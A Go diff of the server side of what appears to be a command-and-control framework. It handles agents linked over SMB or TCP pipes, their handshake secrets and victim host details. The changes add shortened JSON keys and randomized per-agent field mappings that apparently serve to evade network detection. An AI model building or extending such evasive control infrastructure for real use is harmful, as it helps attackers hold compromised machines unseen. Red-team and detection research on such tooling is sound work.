@@ -320,7 +320,7 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 				// It was base64 encoded - check if it's a JSON envelope
 				var envelope struct {
 					Type    string `json:"type"`
-					Payload string `json:"payload"`
+					Payload string `json:"pl"`
 				}
 				if err := json.Unmarshal(rawPayload, &envelope); err == nil && envelope.Payload != "" {
 					encryptedPayload = envelope.Payload
@@ -370,7 +370,9 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 		if resultsRaw, ok := linkedDataMap["results"].([]interface{}); ok {
 			for _, r := range resultsRaw {
 				if rm, ok := r.(map[string]interface{}); ok {
-					results = append(results, rm)
+					// Translate randomized field names back to standard names
+					translated := linkedConn.TranslateResult(rm)
+					results = append(results, translated)
 				}
 			}
 		}
@@ -490,8 +492,8 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 
 	// Parse the outer envelope to get the encrypted_key and encrypted_data
 	var envelope struct {
-		EncryptedKey  string `json:"encrypted_key"`
-		EncryptedData string `json:"encrypted_data"`
+		EncryptedKey  string `json:"ek"`
+		EncryptedData string `json:"ed"`
 	}
 	if err := json.Unmarshal(payloadBytes, &envelope); err != nil {
 		return nil, fmt.Errorf("failed to parse handshake envelope: %w", err)
@@ -539,6 +541,19 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 		return nil, fmt.Errorf("failed to parse system info: %w", err)
 	}
 
+	// Extract field mapping from metadata (if present)
+	var fieldMappingJSON *string
+	var fieldMapping map[string]string
+	if jfm, ok := sysInfo.Metadata["jfm"]; ok && jfm != "" {
+		fieldMappingJSON = &jfm
+		// Parse it for in-memory use
+		if err := json.Unmarshal([]byte(jfm), &fieldMapping); err != nil {
+			log.Printf("[Link Handshake] Warning: Failed to parse field mapping: %v", err)
+		} else {
+			log.Printf("[Link Handshake] Received field mapping with %d entries", len(fieldMapping))
+		}
+	}
+
 	// Generate secrets from the seed (same as normal handshake)
 	secret1, secret2 := generateInitialSecrets(matchedInit.Secret, sysInfo.AgentInfo.Seed)
 
@@ -573,30 +588,32 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 		isReconnect = true
 		newClientID = existingClientID
 
-		// Update the existing connection with new secrets, parent, and link_type
+		// Update the existing connection with new secrets, parent, link_type, and field mapping
 		_, err = m.db.ExecContext(ctx, `
 			UPDATE connections SET
 				secret1 = $1, secret2 = $2,
 				extIP = $3, parent_clientID = $4,
 				lastSEEN = CURRENT_TIMESTAMP,
-				pid = $5, link_type = $6
-			WHERE newclientID = $7`,
+				pid = $5, link_type = $6, field_mapping = $7
+			WHERE newclientID = $8`,
 			secret1, secret2,
 			extIP, edgeClientID,
 			fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
 			linkType, // Ensure link_type is set/updated on reconnect
+			fieldMappingJSON,
 			newClientID,
 		)
 		if err != nil {
 			return nil, fmt.Errorf("failed to update linked connection: %w", err)
 		}
 
-		// Update active connections with new secrets (must use UpdateConnection for existing connections)
+		// Update active connections with new secrets and field mapping (must use UpdateConnection for existing connections)
 		if err := m.activeConnections.UpdateConnection(&ActiveConnection{
-			ClientID: newClientID,
-			Protocol: protocolUpper,
-			Secret1:  secret1,
-			Secret2:  secret2,
+			ClientID:     newClientID,
+			Protocol:     protocolUpper,
+			Secret1:      secret1,
+			Secret2:      secret2,
+			FieldMapping: fieldMapping,
 		}); err != nil {
 			log.Printf("[WARN] Failed to update active connection for reconnecting agent %s: %v", newClientID, err)
 		}
@@ -605,18 +622,18 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 		isReconnect = false
 		newClientID = generateNewClientID()
 
-		// Store the connection with parent reference
+		// Store the connection with parent reference and field mapping
 		_, err = m.db.ExecContext(ctx, `
 			INSERT INTO connections (
 				newclientID, clientID, protocol, secret1, secret2,
 				extIP, intIP, username, hostname, note,
 				process, pid, arch, lastSEEN, os, proto,
-				parent_clientID, link_type, hop_count
+				parent_clientID, link_type, hop_count, field_mapping
 			) VALUES (
 				$1, $2, $3, $4, $5,
 				$6, $7, $8, $9, $10,
 				$11, $12, $13, CURRENT_TIMESTAMP, $14, $15,
-				$16, $17, $18
+				$16, $17, $18, $19
 			)`,
 			newClientID,
 			matchedInit.ClientID,
@@ -636,17 +653,19 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 			edgeClientID,
 			linkType, // Dynamic: "smb" or "tcp"
 			1,        // hop_count = 1 for direct link
+			fieldMappingJSON,
 		)
 		if err != nil {
 			return nil, fmt.Errorf("failed to store linked connection: %w", err)
 		}
 
-		// Add to active connections
+		// Add to active connections with field mapping
 		if err := m.activeConnections.AddConnection(&ActiveConnection{
-			ClientID: newClientID,
-			Protocol: protocolUpper,
-			Secret1:  secret1,
-			Secret2:  secret2,
+			ClientID:     newClientID,
+			Protocol:     protocolUpper,
+			Secret1:      secret1,
+			Secret2:      secret2,
+			FieldMapping: fieldMapping,
 		}); err != nil {
 			log.Printf("[WARN] Failed to add active connection for new linked agent %s: %v", newClientID, err)
 		}
@@ -712,6 +731,7 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 		SecretsInitialized: true,
 		Signature:          signature,
 		Seed:               sysInfo.AgentInfo.Seed,
+		CommsTemplate:      getCommsTemplateB64(),
 	}
 
 	responseJSON, err := json.Marshal(response)
@@ -1327,7 +1347,7 @@ func reversePipeTransforms(data []byte, profile *config.SMBProfile, prependLen, 
 	if profile == nil || profile.Data == nil || len(profile.Data.Transforms) == 0 {
 		var envelope struct {
 			Type    string `json:"type"`
-			Payload string `json:"payload"`
+			Payload string `json:"pl"`
 		}
 		if err := json.Unmarshal(data, &envelope); err != nil {
 			return "", fmt.Errorf("failed to parse pipe envelope: %w", err)
@@ -1351,7 +1371,7 @@ func reversePipeTransforms(data []byte, profile *config.SMBProfile, prependLen, 
 	// Parse the JSON envelope
 	var envelope struct {
 		Type    string `json:"type"`
-		Payload string `json:"payload"`
+		Payload string `json:"pl"`
 	}
 	if err := json.Unmarshal(reversed, &envelope); err != nil {
 		return "", fmt.Errorf("failed to parse reversed pipe envelope: %w", err)
